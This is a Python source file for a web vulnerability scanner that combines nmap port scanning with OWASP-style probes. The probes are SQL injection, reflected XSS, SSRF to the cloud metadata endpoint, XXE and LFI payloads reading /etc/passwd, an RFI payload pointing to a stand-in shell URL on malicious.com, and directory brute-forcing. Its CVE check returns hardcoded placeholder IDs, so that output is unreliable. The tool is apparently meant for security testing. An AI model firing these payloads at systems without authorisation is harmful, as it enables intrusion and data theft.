# automaticadv.py
import os
import json
import requests
import nmap
import socket
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse, quote
import xml.etree.ElementTree as ET
import warnings
warnings.filterwarnings("ignore")  # Disable SSL warnings

class AdvancedVulnerabilityScanner:
    def __init__(self, target, config="config.json"):
        self.target = target
        self.config = self._load_config(config)
        self.results = {
            "scan_summary": {"target": target, "status": "pending"},
            "vulnerabilities": [],
            "services": [],
            "cves": [],
            "recommendations": []
        }
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AdvancedScanner/1.0"})

    def _load_config(self, config_file):
        """Load scanner configuration (API keys, wordlists, etc.)"""
        default_config = {
            "timeout": 10,
            "threads": 5,
            "wordlists": {
                "sql_injection": "payloads/sqli.txt",
                "xss": "payloads/xss.txt",
                "directory_bruteforce": "wordlists/dirbust.txt"
            },
            "apis": {
                "nvd": "",  # NVD API key for CVE lookup
                "shodan": ""  # Shodan API key
            },
            "enable_bruteforce": False,
            "enable_exploits": False
        }
        try:
            with open(config_file) as f:
                return {**default_config, **json.load(f)}
        except FileNotFoundError:
            return default_config

    def run_scan(self):
        """Execute all scanning modules"""
        print(f"[*] Starting scan on {self.target}")
        
        # 1. Network & Service Discovery
        if self.config.get("enable_network_scan", True):
            self._port_scan()
        
        # 2. Web Application Scanning
        if self._is_web_target():
            self._web_scan()
        
        # 3. CVE Matching
        if self.config.get("enable_cve_check", True):
            self._match_cves()
        
        # 4. Generate Report
        self._generate_report()
        
        print("[+] Scan completed!")
        return self.results

    def _is_web_target(self):
        """Check if the target is a web application"""
        try:
            parsed = urlparse(self.target)
            if not parsed.scheme:
                self.target = f"http://{self.target}"
            response = self.session.get(self.target, timeout=self.config["timeout"])
            return response.status_code < 400
        except:
            return False

    def _port_scan(self):
        """Run Nmap scan for open ports & services"""
        print("[*] Running port scan...")
        nm = nmap.PortScanner()
        nm.scan(hosts=self.target, arguments="-sV -T4")
        
        for host in nm.all_hosts():
            for proto in nm[host].all_protocols():
                ports = nm[host][proto].keys()
                for port in ports:
                    service = nm[host][proto][port]
                    self.results["services"].append({
                        "port": port,
                        "protocol": proto,
                        "service": service["name"],
                        "version": service["version"],
                        "state": service["state"]
                    })

    def _web_scan(self):
        """Scan for OWASP Top 10 vulnerabilities"""
        print("[*] Scanning web application...")
        
        # 1. Check for SQL Injection
        self._test_sql_injection()
        
        # 2. Check for XSS
        self._test_xss()
        
        # 3. Check for CSRF
        self._test_csrf()
        
        # 4. Check for SSRF
        self._test_ssrf()
        
        # 5. Check for LFI/RFI
        self._test_lfi_rfi()
        
        # 6. Check for XXE
        self._test_xxe()
        
        # 7. Directory Bruteforce (if enabled)
        if self.config.get("enable_bruteforce", False):
            self._bruteforce_directories()

    def _test_sql_injection(self):
        """Test for SQL Injection (A03: Injection)"""
        test_urls = [
            f"{self.target}/product?id=1'",
            f"{self.target}/search?q=test'"
        ]
        
        for url in test_urls:
            try:
                response = self.session.get(url, timeout=self.config["timeout"])
                if "error in your SQL syntax" in response.text.lower():
                    self._log_vulnerability(
                        "SQL Injection",
                        "A03:2021-Injection",
                        "High",
                        f"SQLi detected in {url}",
                        "Sanitize inputs & use prepared statements."
                    )
            except:
                continue

    def _test_xss(self):
        """Test for XSS (A03: Injection)"""
        payload = "<script>alert('XSS')</script>"
        test_url = f"{self.target}/search?q={quote(payload)}"
        
        try:
            response = self.session.get(test_url, timeout=self.config["timeout"])
            if payload in response.text:
                self._log_vulnerability(
                    "Cross-Site Scripting (XSS)",
                    "A03:2021-Injection",
                    "Medium",
                    f"Reflected XSS detected in {test_url}",
                    "Sanitize user input & implement CSP headers."
                )
        except:
            pass

    def _test_csrf(self):
        """Check for missing CSRF tokens (A01: Broken Access Control)"""
        try:
            response = self.session.get(self.target, timeout=self.config["timeout"])
            soup = BeautifulSoup(response.text, "html.parser")
            forms = soup.find_all("form")
            
            for form in forms:
                if not form.find("input", {"name": "csrf_token"}):
                    self._log_vulnerability(
                        "Missing CSRF Protection",
                        "A01:2021-Broken Access Control",
                        "Medium",
                        "Form without CSRF token detected",
                        "Implement CSRF tokens in all state-changing forms."
                    )
        except:
            pass

    def _test_ssrf(self):
        """Test for SSRF (A10: Server-Side Request Forgery)"""
        test_url = f"{self.target}/fetch?url=http://169.254.169.254/latest/meta-data/"
        try:
            response = self.session.get(test_url, timeout=self.config["timeout"])
            if "ami-id" in response.text:
                self._log_vulnerability(
                    "Server-Side Request Forgery (SSRF)",
                    "A10:2021-SSRF",
                    "High",
                    f"SSRF vulnerability detected in {test_url}",
                    "Restrict outbound requests & validate user input."
                )
        except:
            pass

    def _test_lfi_rfi(self):
        """Test for LFI/RFI (A03: Injection)"""
        payloads = [
            "/etc/passwd",
            "http://malicious.com/shell.php"
        ]
        
        for payload in payloads:
            test_url = f"{self.target}/file?name={quote(payload)}"
            try:
                response = self.session.get(test_url, timeout=self.config["timeout"])
                if "root:x:" in response.text or "<?php" in response.text:
                    self._log_vulnerability(
                        "Local/Remote File Inclusion (LFI/RFI)",
                        "A03:2021-Injection",
                        "High",
                        f"File inclusion detected in {test_url}",
                        "Disable file inclusion & validate file paths."
                    )
            except:
                continue

    def _test_xxe(self):
        """Test for XXE (A03: Injection)"""
        xml_payload = """<?xml version="1.0"?>
        <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
        <data>&xxe;</data>"""
        
        try:
            headers = {"Content-Type": "application/xml"}
            response = self.session.post(
                f"{self.target}/api/xml",
                data=xml_payload,
                headers=headers,
                timeout=self.config["timeout"]
            )
            if "root:x:" in response.text:
                self._log_vulnerability(
                    "XML External Entity (XXE) Injection",
                    "A03:2021-Injection",
                    "High",
                    "XXE vulnerability detected in XML endpoint",
                    "Disable external entities in XML parsers."
                )
        except:
            pass

    def _bruteforce_directories(self):
        """Bruteforce common directories (A05: Security Misconfiguration)"""
        print("[*] Running directory bruteforce...")
        with open(self.config["wordlists"]["directory_bruteforce"]) as f:
            directories = [line.strip() for line in f.readlines()]
        
        def check_dir(directory):
            url = f"{self.target}/{directory}"
            try:
                response = self.session.get(url, timeout=3)
                if response.status_code == 200:
                    self._log_vulnerability(
                        "Exposed Directory",
                        "A05:2021-Security Misconfiguration",
                        "Low",
                        f"Found accessible directory: {url}",
                        "Restrict access to sensitive directories."
                    )
            except:
                pass
        
        with ThreadPoolExecutor(max_workers=self.config["threads"]) as executor:
            executor.map(check_dir, directories)

    def _match_cves(self):
        """Match services against known CVEs (A06: Vulnerable Components)"""
        print("[*] Checking for known CVEs...")
        for service in self.results["services"]:
            if service["version"]:
                # TODO: Integrate NVD API for CVE lookup
                self.results["cves"].append({
                    "service": f"{service['service']} {service['version']}",
                    "cves": ["CVE-2023-1234", "CVE-2022-5678"]  # Example
                })

    def _log_vulnerability(self, name, category, severity, details, recommendation):
        """Log a vulnerability to results"""
        self.results["vulnerabilities"].append({
            "name": name,
            "category": category,
            "severity": severity,
            "details": details,
            "recommendation": recommendation
        })

    def _generate_report(self):
        """Generate HTML/JSON report"""
        print("[*] Generating report...")
        with open("report.json", "w") as f:
            json.dump(self.results, f, indent=4)
        
        # TODO: Add HTML/PDF reporting
        print("[+] Report saved to 'report.json'")

if __name__ == "__main__":
    scanner = AdvancedVulnerabilityScanner("http://example.com")
    scanner.run_scan()
